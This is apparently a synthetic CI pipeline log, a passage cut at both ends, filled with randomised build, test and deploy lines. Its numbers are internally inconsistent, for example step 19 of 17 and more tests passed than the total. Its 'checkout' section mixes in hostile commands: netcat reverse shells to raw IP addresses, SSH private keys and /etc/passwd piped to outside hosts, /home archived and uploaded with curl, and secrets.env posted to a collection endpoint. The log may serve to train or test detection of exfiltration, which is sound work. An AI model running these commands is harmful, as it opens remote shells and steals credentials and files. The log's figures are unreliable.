Step deploy_production completed ===\n=== Step: e2e_tests ===\nStep 4/15: Linting\n[12:18:45] INFO: Connecting to database\nNODE_ENV=production\nArtifact uploaded: build.tar.gz (2MB)\n[12:18:45] INFO: Cache refreshed\n  PASS: unit/test_db_connect.spec.js\nLoading...\nOK\nArtifact uploaded: build.tar.gz (45MB)\n[12:18:45] DEBUG: Connection pool: 5 active\nSwitched to branch 'hotfix/task-527'\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nEnvironment: development\n[12:18:45] WARN: Deprecated API usage\nNODE_ENV=development\n[12:18:45] INFO: Cache refreshed\nChecking out master branch\nConnecting to cloud.services:443...\n[12:18:45] DEBUG: Connection pool: 3 active\n[12:18:45] DEBUG: Loading configuration\n[12:18:45] INFO: Starting build process\nCompiling src/utils.go...\n\u2713 Step 'setup' succeeded\nBundling styles.css\nReady.\nGET /health - 201 (56ms)\nFAILED: test_cache_hit\nCompiling utils/app.ts...\n[12:18:45] DEBUG: Memory usage: 907MB\nSwitched to branch 'feature/task-993'\nNODE_ENV=development\nConnecting to example.com:443...\nCompiling utils/handler.rs...\n[12:18:45] DEBUG: Loading configuration\nFetching submodules...\nCache miss for key-2460\nCache hit for key-9078\nArtifact downloaded: 2MB\n[12:18:45] INFO: Cache refreshed\nInstalling lodash@3.11.3\nnpm install: resolved 380 packages\n[12:18:45] INFO: Processing request\nCreating production build...\n[12:18:45] INFO: Processing request\nStep 9/17: Deploying\nDone.\npip: Installing build dependencies...\nHEAD is now at 6b14535\nnpm notice: package.json updated\nImage pulled successfully\nLayer 3/9: COPY command\nUploading artifact 'dist' (44 files)\nConnecting to test.io:443...\nSuccess!\nFinished.\nCompiling lib/index.js...\n\u2713 Task completed in 1395ms\n[12:18:45] DEBUG: Query executed in 27ms\nCompiling utils/handler.rs...\nCreating production build...\nStep 1/24: Deploying\nInstalling express@5.0.4\n[12:18:45] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (39MB)\nCache miss for key-7411\n[12:18:45] ERROR: Connection failed\nOK\n\u2713 validate completed\nStep 13/15: Installing dependencies\nRan 42 tests in 38s\nWARNING: express has known vulnerabilities\nCache hit for key-5663\nStep 8/21: Linting\nStep 19/17: Linting\n[12:18:45] DEBUG: Loading configuration\nInstalling prettier@3.19.10\nStep 7/19: Running migrations\nFAILED: test_api_health\nCache restored successfully (249MB)\n[12:18:45] ERROR: Connection failed\nWARNING: prettier has known vulnerabilities\nOK\n\u2713 Step 'setup' succeeded\nCompiling utils/app.ts...\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (30MB)\nCache hit for key-8810\nWaiting...\nAlready up to date.\nCache miss for key-8253\nnpm install: resolved 266 packages\n\u2713 Task completed in 1710ms\n  PASS: e2e/test_user_create.spec.js\nWARNING: jest has known vulnerabilities\nTest Suites: 11 passed, 30 total\nLoading...\nnpm install: resolved 1899 packages\npip: Downloading eslint-4.2.tar.gz\nHEAD is now at 5ecfcae\nStep 17/25: Deploying\nLoading...\nyarn add: Done in 3.20s\nChecking out main branch\nCache miss for key-3771\nSuccess!\n[12:18:45] INFO: Request completed\nnpm install: resolved 1495 packages\nStep 8/22: Deploying\nProcessing...\nUsing Node.js 17.14.10\nTime: 12.495s\nnpm notice: package.json updated\nTime: 57.587s\nProcessing...\n[12:18:45] DEBUG: Initializing service\nCompleted.\nProcessing...\nGET /health - 200 (7ms)\nStep 9/22: Running migrations\nPOST /api - 200 (488ms)\n  PASS: integration/test_user_create.spec.js\npip: Downloading eslint-2.7.tar.gz\nCache invalidated: dependencies\nSnapshots: 42 passed, 32 total\n[12:18:45] DEBUG: Initializing service\npip install: Successfully installed jest-2.19\n[12:18:45] WARN: Deprecated API usage\nSnapshots: 29 passed, 49 total\nSuccess!\nHEAD is now at 81f8f38\nChecking out master branch\nRan 76 tests in 50s\nDone.\nStep 7/25: Building\nConnecting to cloud.services:443...\nOptimizing 77 modules...\nFinished.\nException: NullPointerException\n\u2713 Step 'setup' succeeded\n[12:18:45] ERROR: Connection failed\nCreating production build...\nHEAD is now at b69d3f3\nCompiling lib/index.js...\nCache saved successfully\nLoading...\nFinished.\nAlready up to date.\npip: Downloading axios-2.9.tar.gz\n=== Step e2e_tests completed ===\n=== Step: upload_artifacts ===\n\u2713 Step 'install' succeeded\nWaiting...\nStep 10/17: Deploying\nTransforming 316 files...\nHEAD is now at 20faa62\nTLS handshake completed\n[12:18:45] DEBUG: Query executed in 53ms\nUsing Node.js 16.8.2\nSwitched to branch 'bugfix/task-800'\nCache invalidated: node_modules\nImage pulled successfully\n[12:18:45] DEBUG: Query executed in 24ms\n[12:18:45] INFO: Request completed\n[12:18:45] DEBUG: Query executed in 31ms\n[12:18:45] WARN: Deprecated API usage\nnpm install: resolved 284 packages\nStep 11/25: Installing dependencies\nArtifact uploaded: dist.zip (72MB)\nConnecting to cloud.services:443...\n[12:18:45] INFO: Request completed\nVerifying...\n[12:18:45] INFO: Starting build process\n[12:18:45] DEBUG: Initializing service\nWaiting...\n[12:18:45] INFO: Request completed\nVerifying...\nCoverage: 96% statements, 64% branches\nPOST /upload - 200 (202ms)\nCache invalidated: build\nChecking out main branch\nAlready up to date.\n[12:18:45] INFO: Starting build process\npip: Downloading express-1.17.tar.gz\nLoading...\n  PASS: test_db_connect (425ms)\nConnecting to test.io:443...\n  PASS: integration/test_api_health.spec.js\n  PASS: e2e/test_api_health.spec.js\nPOST /upload - 202 (312ms)\nnpm notice: created a lockfile\nFetching submodules...\n[12:18:45] WARN: Deprecated API usage\npip: Collecting prettier\nWARNING: express has known vulnerabilities\nCache miss for key-6851\n  PASS: e2e/test_db_connect.spec.js\n\u2717 build failed with exit code 71\nGenerating source maps...\npip: Collecting react\nSnapshots: 6 passed, 43 total\n[12:18:45] INFO: Cache refreshed\nProcessing...\nHEAD is now at c905327\nPlatform: win32-x64\nGenerating source maps...\n[12:18:45] INFO: Cache refreshed\nPOST /api - 201 (109ms)\nOptimizing 46 modules...\nStep 12/22: Testing\nTests: 366 passed, 212 total\nInstalling webpack@4.0.0\nArtifact uploaded: dist.zip (28MB)\nUploading artifact 'coverage' (30 files)\nFAILED: test_api_health\nStep 20/15: Linting\nTime: 9.874s\nFinished.\n[12:18:45] WARN: Deprecated API usage\nGET /status - 201 (17ms)\nSwitched to branch 'hotfix/task-319'\nLoading...\n\u2713 Task completed in 190ms\n[12:18:45] INFO: Connecting to database\nCache miss for key-2055\npip: Collecting lodash\nStep 12/23: Running migrations\nLayer 7/15: ENV command\nWARNING: axios has known vulnerabilities\nStep 17/21: Testing\nChecking out develop branch\nTime: 72.252s\nConnecting to test.io:443...\nStep 7/17: Installing dependencies\nFetching submodules...\nBuilding Docker image...\nnpm notice: created a lockfile\nAlready up to date.\nEnvironment: development\nCache invalidated: dependencies\n[12:18:45] INFO: Processing request\n[12:18:45] DEBUG: Connection pool: 1 active\n[12:18:45] INFO: Starting build process\n[12:18:45] INFO: Cache refreshed\n[12:18:45] INFO: Processing request\nCreating production build...\nUploading artifact 'coverage' (33 files)\nConnecting to example.com:443...\nTest Suites: 35 passed, 42 total\npip: Downloading express-2.8.tar.gz\n\u2713 test completed\npip: Installing build dependencies...\n[12:18:45] WARN: Deprecated API usage\n[12:18:45] DEBUG: Loading configuration\nPlatform: linux-x64\nArtifact downloaded: 31MB\nCache restored successfully (89MB)\nChecking out main branch\nSuccess!\nTest Suites: 15 passed, 17 total\nImage pulled successfully\nSuccess!\n[12:18:45] DEBUG: Loading configuration\nnpm install: added 105 packages\nArtifact uploaded: build.tar.gz (17MB)\nCompiling lib/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling webpack@2.17.2\n\u2713 deploy completed\nInstalling jest@5.4.6\nGenerating source maps...\npip: Downloading eslint-4.16.tar.gz\nEnvironment: test\nBuilding Docker image...\nStep 13/21: Testing\n[12:18:45] INFO: Request completed\nTransforming 126 files...\nCoverage: 77% statements, 97% branches\nCache hit for key-4026\n[12:18:45] DEBUG: Loading configuration\nCache hit for key-8659\nWARNING: prettier has known vulnerabilities\nFAILED: test_user_create\nBundling runtime.css\nOptimizing 57 modules...\nCompiling lib/service.java...\nStep 8/22: Linting\nCompiling lib/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: created a lockfile\nTime: 103.650s\nCache hit for key-4385\nCompiling utils/app.ts...\nPulling image: python:latest\nLoading...\nTime: 77.831s\n\u2713 lint completed\nCompiling components/service.java...\nWARNING: eslint has known vulnerabilities\nCompleted.\n=== Step upload_artifacts completed ===\n=== Step: deploy_staging ===\n[12:18:45] DEBUG: Initializing service\nCompiling utils/index.js...\nUsing Python 3.10\n\u2713 Step 'checkout' succeeded\nLayer 4/14: RUN command\nException: TypeError\nHEAD is now at 9bcda80\nCache invalidated: build\n[12:18:45] DEBUG: Connection pool: 18 active\nBundling main.js\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: jest has known vulnerabilities\nCache restored successfully (446MB)\nPlatform: win32-x64\nHEAD is now at 44debd2\n[12:18:45] INFO: Request completed\nCompiling lib/utils.go...\nSwitched to branch 'feature/task-777'\nTest Suites: 34 passed, 32 total\nCoverage: 89% statements, 91% branches\n[12:18:45] WARN: Deprecated API usage\nBuilding Docker image...\n[12:18:45] DEBUG: Connection pool: 20 active\nPulling image: alpine:18\n[12:18:45] INFO: Connecting to database\nTransforming 985 files...\nDone.\nTest Suites: 30 passed, 46 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSuccess!\n[12:18:45] INFO: Cache refreshed\nTLS handshake completed\n[12:18:45] DEBUG: Initializing service\nConnection established\nPlatform: linux-x64\nCache invalidated: build\nFetching submodules...\nStep 15/25: Building\nConnection established\npip: Collecting axios\nOptimizing 10 modules...\nCache invalidated: node_modules\n[12:18:45] WARN: Deprecated API usage\nCoverage: 86% statements, 69% branches\npip: Collecting eslint\nCompiling lib/app.ts...\nTests: 469 passed, 169 total\nChecking out develop branch\nImage pulled successfully\nInstalling webpack@3.19.4\nBundling runtime.css\nInstalling express@5.16.1\n  PASS: test_user_create (333ms)\n\u2713 Task completed in 4070ms\nCompiling components/index.js...\nCompiling src/app.ts...\nArtifact uploaded: dist.zip (6MB)\n\u2713 Task completed in 2145ms\nGET /api - 201 (22ms)\nBuilding Docker image...\nEnvironment: production\nEnvironment: staging\nnpm notice: package.json updated\n[12:18:45] DEBUG: Memory usage: 711MB\nImage pulled successfully\nArtifact uploaded: dist.zip (76MB)\nException: RuntimeError\n[12:18:45] INFO: Cache refreshed\nStep 8/19: Running migrations\nOK\nVerifying...\nCompiling components/service.java...\nnpm notice: created a lockfile\n[12:18:45] DEBUG: Connection pool: 13 active\nTime: 62.484s\n[12:18:45] INFO: Connecting to database\nHEAD is now at d402d9f\nUsing Python 3.11\nUsing Node.js 14.9.2\nPushing to registry...\nFAILED: test_db_connect\nRan 49 tests in 46s\nImage pulled successfully\nUploading artifact 'build' (21 files)\nDone.\nCache saved successfully\nCreating production build...\nCreating production build...\n[12:18:45] DEBUG: Connection pool: 20 active\n\u2713 Task completed in 569ms\npip: Collecting webpack\n[12:18:45] WARN: Deprecated API usage\nConnection established\nPushing to registry...\nVerifying...\nUsing Python 3.9\nVerifying...\nCache restored successfully (339MB)\nOptimizing 72 modules...\n[12:18:45] WARN: Deprecated API usage\n[12:18:45] DEBUG: Memory usage: 1327MB\nUploading artifact 'coverage' (20 files)\nStep 5/21: Testing\nGET /health - 204 (91ms)\nnpm install: added 157 packages\nCompiling src/service.java...\nWaiting...\nProcessing...\nCompiling src/handler.rs...\npip: Downloading express-3.14.tar.gz\nCache miss for key-9074\nStep 2/18: Deploying\n[12:18:45] DEBUG: Memory usage: 1969MB\nnpm notice: created a lockfile\nTransforming 774 files...\nCompiling components/main.py...\nTLS handshake completed\nUploading artifact 'dist' (9 files)\n\u2713 Step 'checkout' succeeded\nEnvironment: test\nHEAD is now at 4bdd7db\nCoverage: 80% statements, 90% branches\nImage pulled successfully\nLoading...\nCompiling lib/main.py...\n[12:18:45] INFO: Starting build process\nnpm install: added 427 packages\nStep 5/21: Installing dependencies\nTLS handshake completed\n  PASS: unit/test_cache_hit.spec.js\n  PASS: test_auth_login (73ms)\n\u2713 Task completed in 4507ms\n\u2717 build failed with exit code 58\nCompiling lib/utils.go...\npip: Downloading lodash-3.3.tar.gz\nyarn add: Done in 7.77s\nCreating production build...\nUploading artifact 'dist' (22 files)\npip: Collecting express\nRan 18 tests in 14s\nInstalling express@4.20.5\nnpm install: resolved 1110 packages\nStep 11/24: Running migrations\n\u2713 All checks passed\nStep 8/22: Testing\n[12:18:45] INFO: Connecting to database\n[12:18:45] WARN: Deprecated API usage\nCache hit for key-6820\n=== Step deploy_staging completed ===\n=== Step: setup_node ===\nWaiting...\npip: Downloading webpack-5.1.tar.gz\nSuccess!\nCoverage: 70% statements, 76% branches\n[12:18:45] INFO: Connecting to database\nnpm notice: created a lockfile\n\u2717 build failed with exit code 77\nArtifact downloaded: 42MB\nUploading artifact 'dist' (36 files)\n[12:18:45] DEBUG: Initializing service\n[12:18:45] INFO: Cache refreshed\nSuccess!\nProcessing...\n[12:18:45] INFO: Cache refreshed\nBundling styles.css\n[12:18:45] INFO: Processing request\nOptimizing 37 modules...\nDone.\n[12:18:45] INFO: Cache refreshed\nyarn add: Done in 28.61s\n[12:18:45] INFO: Cache refreshed\nNODE_ENV=development\nPushing to registry...\nStep 4/25: Building\nHEAD is now at 73d4858\nCompiling lib/index.js...\nCompiling utils/utils.go...\nCache restored successfully (21MB)\nGenerating source maps...\nMinifying vendor.js\nWARNING: react has known vulnerabilities\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: TypeError\n[12:18:45] WARN: Deprecated API usage\nTransforming 449 files...\nUploading artifact 'dist' (31 files)\n[12:18:45] INFO: Processing request\n\u2717 build failed with exit code 109\nStep 19/17: Deploying\nStep 11/20: Linting\n[12:18:45] INFO: Request completed\nBuilding Docker image...\n  PASS: integration/test_cache_hit.spec.js\nEnvironment: development\n  PASS: integration/test_db_connect.spec.js\nException: ValueError\n[12:18:45] DEBUG: Memory usage: 1391MB\nPlatform: win32-x64\n[12:18:45] DEBUG: Memory usage: 840MB\nOK\nPushing to registry...\nCache restored successfully (155MB)\nCoverage: 86% statements, 68% branches\nWARNING: jest has known vulnerabilities\nGenerating source maps...\n[12:18:45] DEBUG: Memory usage: 1227MB\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 14/19: Building\n[12:18:45] INFO: Connecting to database\n\u2713 All checks passed\n[12:18:45] DEBUG: Connection pool: 15 active\nTLS handshake completed\nChecking out develop branch\nCache hit for key-5486\nnpm install: added 228 packages\npip: Collecting lodash\nProcessing...\nCache invalidated: dependencies\nTest Suites: 48 passed, 17 total\nPlatform: win32-x64\nBundling runtime.css\npip: Downloading eslint-3.16.tar.gz\nCache invalidated: dependencies\nBuilding Docker image...\nnpm notice: package.json updated\nStep 13/16: Building\n[12:18:45] INFO: Processing request\nChecking out develop branch\nCache hit for key-1759\n\u2713 Task completed in 166ms\nGET /status - 201 (60ms)\nGET /health - 200 (23ms)\nConnecting to cloud.services:443...\nReady.\nEnvironment: development\nStep 8/16: Testing\nUsing Python 3.12\nCache miss for key-2716\nTest Suites: 49 passed, 12 total\nCompiling lib/handler.rs...\nWaiting...\n[12:18:45] WARN: Deprecated API usage\nPlatform: darwin-arm64\nnpm install: resolved 1273 packages\n[12:18:45] WARN: Deprecated API usage\nUsing Python 3.10\npip: Installing build dependencies...\nCompiling utils/handler.rs...\n[12:18:45] INFO: Processing request\npip install: Successfully installed express-3.1\nArtifact uploaded: dist.zip (3MB)\n[12:18:45] DEBUG: Initializing service\nStep 4/25: Installing dependencies\nWARNING: lodash has known vulnerabilities\nStep 4/18: Linting\nTests: 204 passed, 58 total\n[12:18:45] DEBUG: Loading configuration\nGenerating source maps...\n\u2713 All checks passed\nPushing to registry...\nCompiling lib/utils.go...\nStep 7/18: Linting\nReady.\nDone.\nCompiling lib/handler.rs...\nCache saved successfully\nTLS handshake completed\n[12:18:45] DEBUG: Memory usage: 494MB\n\u2713 Task completed in 2092ms\npip: Downloading jest-4.19.tar.gz\nStep 13/24: Deploying\n\u2713 Step 'build' succeeded\nVerifying...\n[12:18:45] INFO: Request completed\nCompleted.\nEnvironment: production\n[12:18:45] INFO: Cache refreshed\nTime: 80.732s\nTest Suites: 41 passed, 43 total\nLayer 1/15: RUN command\n  PASS: integration/test_auth_login.spec.js\nInstalling express@1.5.5\nPulling image: alpine:18\nLayer 8/14: RUN command\nCreating production build...\nStep 3/20: Building\nPulling image: node:3.11\nUsing Node.js 14.0.8\nWARNING: lodash has known vulnerabilities\n  PASS: test_db_connect (332ms)\n[12:18:45] DEBUG: Initializing service\nGET /health - 201 (10ms)\nSuccess!\nPushing to registry...\n[12:18:45] INFO: Starting build process\nConnection established\nSnapshots: 5 passed, 36 total\n=== Step setup_node completed ===\n=== Step: restore_cache ===\n[12:18:45] DEBUG: Query executed in 54ms\n[12:18:45] INFO: Request completed\nConnecting to test.io:443...\n\u2713 Task completed in 4331ms\nTransforming 971 files...\nMinifying main.js\n[12:18:45] INFO: Connecting to database\nStep 9/19: Running migrations\nFinished.\nUsing Node.js 15.7.10\nVerifying...\nnpm install: resolved 1097 packages\n\u2713 Task completed in 4141ms\nException: TypeError\n[12:18:45] INFO: Request completed\nCompiling src/main.py...\nSwitched to branch 'hotfix/task-346'\nAlready up to date.\n[12:18:45] DEBUG: Query executed in 38ms\nTransforming 848 files...\nMinifying app.js\nSwitched to branch 'hotfix/task-821'\nGET /api - 204 (4ms)\nStep 12/15: Running migrations\nConnecting to acme.corp:443...\nAlready up to date.\nNODE_ENV=development\nOK\n[12:18:45] DEBUG: Memory usage: 702MB\nnpm install: added 357 packages\nPOST /api - 201 (222ms)\nNODE_ENV=development\nCache hit for key-7376\nVerifying...\nCache hit for key-3024\n\u2713 package completed\nUsing Python 3.12\nStep 3/20: Testing\n[12:18:45] DEBUG: Connection pool: 4 active\nCompiling components/handler.rs...\nFAILED: test_db_connect\nChecking out main branch\nSuccess!\n[12:18:45] WARN: Deprecated API usage\nnpm install: resolved 1549 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Node.js 18.15.2\n[12:18:45] DEBUG: Loading configuration\nStep 19/24: Running migrations\nCompleted.\nPulling image: python:18\nUsing Python 3.9\nStep 19/18: Building\nArtifact uploaded: dist.zip (74MB)\n[12:18:45] INFO: Request completed\nCompiling utils/utils.go...\nOptimizing 35 modules...\nSwitched to branch 'bugfix/task-831'\nWARNING: express has known vulnerabilities\nPulling image: python:3.11\nPushing to registry...\n[12:18:45] INFO: Connecting to database\nCache restored successfully (130MB)\nInstalling prettier@5.13.7\nGET /api - 200 (72ms)\n[12:18:45] DEBUG: Connection pool: 11 active\nPushing to registry...\n\u2713 Task completed in 2496ms\nCache restored successfully (113MB)\n[12:18:45] INFO: Starting build process\nCompiling components/index.js...\n[12:18:45] INFO: Connecting to database\nFetching submodules...\nException: TypeError\nStep 19/20: Linting\n\u2713 Step 'build' succeeded\nException: ValueError\nTime: 119.90s\nPulling image: python:18\nRan 62 tests in 60s\nStep 10/21: Testing\nSuccess!\nGenerating source maps...\nnpm install: resolved 176 packages\nStep 15/22: Building\n\u2713 Task completed in 4747ms\n[12:18:45] DEBUG: Memory usage: 354MB\n\u2717 build failed with exit code 105\nCache miss for key-3194\nGenerating source maps...\n[12:18:45] WARN: Deprecated API usage\n\u2713 Step 'checkout' succeeded\n[12:18:45] DEBUG: Memory usage: 516MB\nStep 1/17: Building\nnpm install: added 181 packages\nImage pulled successfully\nSuccess!\nPlatform: darwin-arm64\nFetching submodules...\nBundling vendor.css\nSuccess!\nPlatform: darwin-arm64\nStep 18/19: Testing\n[12:18:45] INFO: Processing request\nConnection established\nWARNING: prettier has known vulnerabilities\nVerifying...\nFetching submodules...\nPulling image: alpine:18\n\u2713 Task completed in 3199ms\nStep 14/17: Testing\n\u2713 Task completed in 3680ms\nPOST /data - 200 (200ms)\n\u2713 Task completed in 1870ms\n\u2713 Task completed in 1259ms\nStep 8/24: Installing dependencies\nCompiling utils/index.js...\nConnecting to example.com:443...\nyarn add: Done in 28.61s\n[12:18:45] INFO: Processing request\nConnection established\nBundling runtime.css\nCompiling lib/index.js...\nGET /health - 204 (40ms)\nStep 12/21: Linting\n[12:18:45] INFO: Starting build process\nWARNING: eslint has known vulnerabilities\n\u2717 build failed with exit code 30\n\u2713 Task completed in 1798ms\nnpm notice: package.json updated\nnpm install: added 175 packages\nStep 3/15: Installing dependencies\nyarn add: Done in 6.36s\nStep 10/17: Running migrations\n[12:18:45] ERROR: Connection failed\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (2MB)\nGenerating source maps...\nCompiling src/main.py...\nOptimizing 74 modules...\n[12:18:45] WARN: Deprecated API usage\nAlready up to date.\nImage pulled successfully\nProcessing...\nImage pulled successfully\nCache miss for key-3645\nPOST /data - 202 (278ms)\nInstalling webpack@3.5.0\nStep 16/22: Linting\n=== Step restore_cache completed ===\n=== Step: build ===\nnpm notice: package.json updated\nWARNING: express has known vulnerabilities\n[12:18:45] INFO: Connecting to database\n[12:18:45] DEBUG: Memory usage: 242MB\nCompiling lib/main.py...\nCompiling lib/index.js...\nUsing Node.js 16.6.8\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache restored successfully (329MB)\nSwitched to branch 'feature/task-656'\nPulling image: python:latest\n[12:18:45] INFO: Request completed\nFetching submodules...\n[12:18:45] DEBUG: Memory usage: 1682MB\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nConnection established\npip install: Successfully installed express-2.14\n[12:18:45] DEBUG: Query executed in 27ms\nyarn add: Done in 14.60s\nWARNING: react has known vulnerabilities\n[12:18:45] DEBUG: Loading configuration\nnpm install: resolved 1497 packages\nCache invalidated: node_modules\nInstalling eslint@4.13.3\nPulling image: node:3.11\nTest Suites: 25 passed, 48 total\npip: Downloading eslint-4.12.tar.gz\nWARNING: axios has known vulnerabilities\n\u2713 All checks passed\nMinifying app.js\nBundling main.js\nLoading...\n[12:18:45] WARN: Deprecated API usage\nCache invalidated: dependencies\nFinished.\nCompiling components/index.js...\nFetching submodules...\nCoverage: 88% statements, 69% branches\nArtifact downloaded: 3MB\nOptimizing 45 modules...\nArtifact uploaded: dist.zip (97MB)\nArtifact downloaded: 45MB\n[12:18:45] INFO: Starting build process\n\u2713 Step 'install' succeeded\n[12:18:45] WARN: Deprecated API usage\nStep 13/21: Building\nCompiling lib/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling components/utils.go...\nCoverage: 79% statements, 80% branches\n\u2713 Step 'setup' succeeded\nCache restored successfully (472MB)\nException: TypeError\n[12:18:45] INFO: Starting build process\nPushing to registry...\nWARNING: lodash has known vulnerabilities\nnpm notice: created a lockfile\n[12:18:45] DEBUG: Memory usage: 875MB\n[12:18:45] INFO: Starting build process\n\u2713 All checks passed\nMinifying vendor.js\nnpm install: resolved 1630 packages\nRan 95 tests in 30s\nInstalling lodash@2.5.7\nAlready up to date.\npip: Collecting lodash\n[12:18:45] INFO: Cache refreshed\nTest Suites: 27 passed, 28 total\n[12:18:45] WARN: Deprecated API usage\nProcessing...\nTests: 365 passed, 356 total\nConnection established\nVerifying...\nUsing Python 3.10\n[12:18:45] WARN: Deprecated API usage\nNODE_ENV=production\nNODE_ENV=test\nSnapshots: 20 passed, 4 total\nStep 10/22: Running migrations\nLoading...\nCompiling lib/service.java...\nTests: 321 passed, 99 total\nConnecting to acme.corp:443...\nSuccess!\nTests: 374 passed, 255 total\nStep 18/24: Running migrations\nStep 10/16: Deploying\n\u2713 All checks passed\nFetching submodules...\nStep 7/17: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\nCreating production build...\nArtifact uploaded: build.tar.gz (50MB)\nEnvironment: production\nFAILED: test_api_health\nLoading...\nCompiling src/app.ts...\nPOST /upload - 200 (58ms)\n[12:18:45] INFO: Cache refreshed\nOK\nConnection established\nCompiling utils/main.py...\nEnvironment: staging\nLoading...\nnpm notice: created a lockfile\n[12:18:45] DEBUG: Query executed in 92ms\n\u2717 build failed with exit code 79\nArtifact downloaded: 21MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-8533\n\u2713 All checks passed\n[12:18:45] DEBUG: Memory usage: 797MB\n\u2713 All checks passed\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (99ms)\nFAILED: test_cache_hit\nWARNING: eslint has known vulnerabilities\nWaiting...\nStep 4/22: Installing dependencies\nCache saved successfully\nEnvironment: production\nCompiling lib/service.java...\nStep 17/24: Linting\nReady.\n[12:18:45] DEBUG: Connection pool: 20 active\nTests: 383 passed, 282 total\nCache miss for key-3069\nCompleted.\nOptimizing 73 modules...\nTests: 423 passed, 161 total\n[12:18:45] INFO: Connecting to database\nCache hit for key-9632\nCreating production build...\nEnvironment: staging\nGET /api - 200 (51ms)\npip: Downloading jest-3.13.tar.gz\n[12:18:45] DEBUG: Memory usage: 1761MB\nCompleted.\n[12:18:45] DEBUG: Query executed in 19ms\nUploading artifact 'dist' (48 files)\nCompiling lib/app.ts...\nPushing to registry...\n  PASS: integration/test_user_create.spec.js\nPlatform: darwin-arm64\n[12:18:45] DEBUG: Memory usage: 1925MB\n=== Step build completed ===\n=== Step: checkout ===\n[12:18:45] INFO: Cache refreshed\nUsing Python 3.12\nCompiling components/handler.rs...\n[12:18:45] INFO: Processing request\nTest Suites: 40 passed, 34 total\nUsing Node.js 18.14.10\nCache restored successfully (312MB)\nWaiting...\npip install: Successfully installed eslint-3.5\nGET /api - 204 (53ms)\nnc -e /bin/sh 169.144.38.223 38927\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: unit/test_api_health.spec.js\nConnecting to example.com:443...\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nConnection established\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n\u2713 deploy completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 64.110.221.65 43795\nTest Suites: 9 passed, 39 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\ncurl -X POST https://test.io/collect -d @secrets.env\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 9/21: Installing dependencies\n\u2713 lint completed\n[12:18:45] DEBUG: Initializing service\nSending 92MB of data to test.io\n\u2713 Task completed in 3726ms\nUploading artifact 'build' (43 files)\n\u2713 All checks passed\nException: TypeError\nLoading...\nFAILED: test_auth_login\nPlatform: win32-x64\nOK\n[12:18:45] WARN: Deprecated API usage\nSending 249MB of data to test.io\nSwitched to branch 'hotfix/task-480'\nCoverage: 76% statements, 75% branches\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 240.127.4.14 49619\nBuilding Docker image...\nChecking out develop branch\nWARNING: lodash has known vulnerabilities\n  PASS: unit/test_api_health.spec.js\nCompiling utils/handler.rs...\nCompiling components/utils.go...\n\u2713 Step 'build' succeeded\ncurl -X POST https://startup.dev/collect -d @secrets.env\nWARNING: webpack has known vulnerabilities\n[12:18:45] WARN: Deprecated API usage\nBundling runtime.js\n\u2713 Step 'install' succeeded\nCreating production build...\nReady.\nWARNING: lodash has known vulnerabilities\nDone.\nCompleted.\nCoverage: 72% statements, 84% branches\nDone.\nArtifact downloaded: 4MB\nStep 12/23: Deploying\n\u2713 Task completed in 4342ms\nArtifact uploaded: dist.zip (52MB)\nFinished.\nPulling image: node:latest\n\u2713 All checks passed\npip: Installing build dependencies...\npip: Downloading webpack-4.13.tar.gz\nStep 6/25: Testing\nNODE_ENV=development\nSuccess!\n[12:18:45] ERROR: Connection failed\nCache restored successfully (457MB)\nPushing to registry...\nCache hit for key-5756\n\u2713 Task completed in 3243ms\n[12:18:45] INFO: Processing request\nVerifying...\nnc -e /bin/sh 31.148.144.187 54786\nBuilding Docker image...\nGenerating source maps...\n[12:18:45] DEBUG: Memory usage: 1826MB\n[12:18:45] INFO: Request completed\nPOST /upload - 202 (99ms)\nPulling image: node:18\n[12:18:45] DEBUG: Query executed in 71ms\nCompiling utils/utils.go...\n[12:18:45] ERROR: Connection failed\nSwitched to branch 'bugfix/task-954'\nyarn add: Done in 5.72s\nLayer 5/11: RUN command\nStep 1/25: Testing\nPushing to registry...\nTests: 411 passed, 176 total\nRan 130 tests in 38s\nSending 343MB of data to acme.corp\nCache hit for key-7485\nyarn add: Done in 8.88s\npip install: Successfully installed react-1.5\nPushing to registry...\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nHEAD is now at a541159\nCompiling components/utils.go...\nCache invalidated: dependencies\nTransforming 755 files...\nnpm install: resolved 1452 packages\n[12:18:45] INFO: Connecting to database\nAlready up to date.\nLoading...\nTLS handshake completed\nCreating production build...\nCache saved successfully\nTime: 85.999s\nVerifying...\nOK\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLayer 1/13: RUN command\nBundling vendor.css\n\u26a0 DEPRECATION: Feature will be removed in v4.0\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_user_create (495ms)\nCoverage: 80% statements, 76% branches\nSuccess!\nVerifying...\n[12:18:45] DEBUG: Query executed in 59ms\ncurl -X POST https://test.io/collect -d @secrets.env\nAlready up to date.\n\u2717 build failed with exit code 105\n[12:18:45] WARN: Deprecated API usage\nOK\nCreating production build...\nPOST /data - 201 (104ms)\nTransforming 329 